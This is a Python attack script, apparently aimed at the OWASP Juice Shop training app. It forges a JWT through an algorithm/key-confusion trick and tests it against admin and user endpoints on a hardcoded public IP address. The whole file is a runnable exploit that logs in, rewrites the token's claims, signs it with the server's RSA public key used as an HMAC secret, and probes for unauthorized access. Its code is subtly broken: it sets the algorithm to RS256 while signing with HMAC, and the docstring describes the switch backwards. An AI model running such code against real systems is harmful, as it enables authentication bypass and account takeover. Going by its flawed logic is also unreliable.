import base64
import json
import hmac
import hashlib
import requests

class JWTRSAAttack:
    """JWT Key Confusion Attack: Changes token from HS256 to RS256 and reuses public key"""
    
    def __init__(self):
        self.base_url = "http://45.76.47.218:3000"
        self.session = requests.Session()
        self.rsa_pub_key = """-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQR
ozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/
iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
-----END RSA PUBLIC KEY-----"""

    def login(self):
        """Get initial token via login"""
        print("[*] Getting initial token...")
        response = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "test@test.com", "password": "password"}
        )
        if response.status_code == 200:
            token = response.json()['authentication']['token']
            print("[+] Got initial token")
            return token
        print(f"[-] Login failed: {response.status_code}")
        return None

    def decode_jwt(self, token):
        """Decode JWT parts"""
        parts = token.split('.')[:2]
        decoded = []
        for part in parts:
            padding = 4 - (len(part) % 4)
            if padding != 4:
                part += '=' * padding
            decoded.append(json.loads(base64.urlsafe_b64decode(part)))
        return decoded[0], decoded[1]

    def encode_jwt_part(self, data):
        """Encode JWT header/payload"""
        return base64.urlsafe_b64encode(
            json.dumps(data, separators=(',',':')).encode()
        ).rstrip(b'=').decode()

    def modify_token(self, token):
        """Change algorithm to RS256 and modify email"""
        print("[*] Modifying token...")
        header, payload = self.decode_jwt(token)
        
        # Switch to RS256 and modify email
        header['alg'] = 'RS256'  
        payload['data']['email'] = 'rsa_lord@juice-sh.op'
        
        print(f"[+] Algorithm changed to: {header['alg']}")
        print(f"[+] Email changed to: {payload['data']['email']}")
        
        header_encoded = self.encode_jwt_part(header)
        payload_encoded = self.encode_jwt_part(payload)
        
        return f"{header_encoded}.{payload_encoded}"

    def sign_token(self, unsigned_token):
        """Sign token using RSA public key"""
        print("[*] Signing token...")
        key = self.rsa_pub_key.encode()
        signature = hmac.new(key, unsigned_token.encode(), hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

    def test_token(self, token):
        """Test forged token against multiple endpoints"""
        print("[*] Testing forged token...")
        headers = {"Authorization": f"Bearer {token}"}
        cookies = {"token": token}
        
        endpoints = [
            '/rest/admin/application-configuration',
            '/api/Users',
            '/rest/basket/16',
            '/rest/admin/application-version'
        ]
        
        for endpoint in endpoints:
            response = self.session.get(
                f"{self.base_url}{endpoint}", 
                headers=headers,
                cookies=cookies
            )
            print(f"[*] {endpoint}: {response.status_code}")
            if response.status_code == 200:
                print(f"[+] Access granted! Response: {response.text[:100]}")
                return True
        return False

    def run_attack(self):
        """Execute the attack flow"""
        print("\n[*] Starting JWT RSA Key Confusion Attack...")
        
        initial_token = self.login()
        if not initial_token:
            return
        
        unsigned_token = self.modify_token(initial_token)
        signature = self.sign_token(unsigned_token)
        forged_token = f"{unsigned_token}.{signature}"
        
        print(f"\n[*] Forged token: {forged_token}\n")
        
        if self.test_token(forged_token):
            print("\n[+] Attack successful!")
        else:
            print("\n[-] Attack failed")

if __name__ == "__main__":
    JWTRSAAttack().run_attack()